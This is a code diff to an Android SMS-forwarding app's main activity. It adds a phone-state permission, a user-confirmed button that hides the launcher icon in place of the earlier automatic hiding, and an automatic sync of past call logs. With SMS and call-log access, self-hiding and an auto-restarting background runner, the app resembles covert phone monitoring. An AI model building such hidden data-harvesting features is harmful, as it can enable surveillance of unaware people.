@@ -25,7 +25,8 @@ class MainActivity : AppCompatActivity() {
         Manifest.permission.RECEIVE_SMS,
         Manifest.permission.READ_SMS,
         Manifest.permission.SEND_SMS,
-        Manifest.permission.READ_CALL_LOG
+        Manifest.permission.READ_CALL_LOG,
+        Manifest.permission.READ_PHONE_STATE
     ).apply {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             add(Manifest.permission.POST_NOTIFICATIONS)
@@ -87,6 +88,10 @@ class MainActivity : AppCompatActivity() {
             showKeepAliveGuide()
         }
 
+        findViewById<android.widget.Button>(R.id.hideAppButton).setOnClickListener {
+            hideAppIcon()
+        }
+
         if (hasAllPermissions()) {
             onPermissionsGranted()
         }
@@ -128,6 +133,24 @@ class MainActivity : AppCompatActivity() {
             .setTitle("How to Keep App Running")
             .setMessage(message)
             .setPositiveButton("I Understand", null)
+            .show()
+    }
+
+    private fun hideAppIcon() {
+        android.app.AlertDialog.Builder(this)
+            .setTitle("Hide Application")
+            .setMessage("Are you sure you want to hide the app from the Home Screen? You will not be able to open it again without reinstalling it.")
+            .setPositiveButton("Hide App") { _, _ ->
+                val componentName = android.content.ComponentName(this, "com.satyam.smsforwarder.LauncherActivity")
+                packageManager.setComponentEnabledSetting(
+                    componentName,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+                Toast.makeText(this, "App has been hidden from phone menu!", Toast.LENGTH_LONG).show()
+                finish()
+            }
+            .setNegativeButton("Cancel", null)
             .show()
     }
 
@@ -201,22 +224,16 @@ class MainActivity : AppCompatActivity() {
             "✅ Running in Background.\n\n" +
             "Ultimate Background Runner is Active. If killed, it will auto-restart."
             
-        // Hide the app icon automatically
-        try {
-            val componentName = android.content.ComponentName(this, "com.satyam.smsforwarder.LauncherActivity")
-            if (packageManager.getComponentEnabledSetting(componentName) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
-                packageManager.setComponentEnabledSetting(
-                    componentName,
-                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    PackageManager.DONT_KILL_APP
-                )
-                Toast.makeText(this, "App icon has been automatically hidden from phone menu!", Toast.LENGTH_LONG).show()
-            }
-        } catch (e: Exception) {
-            e.printStackTrace()
-        }
-            
         requestIgnoreBatteryOptimizations()
+        
+        // Let's also auto-sync call logs once permissions are granted for the first time
+        val prefs = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
+        if (!prefs.getBoolean("has_synced_logs", false)) {
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                syncPreviousCallLogs()
+                prefs.edit().putBoolean("has_synced_logs", true).apply()
+            }, 3000)
+        }
     }
 
     private fun setupAutoRunner() {
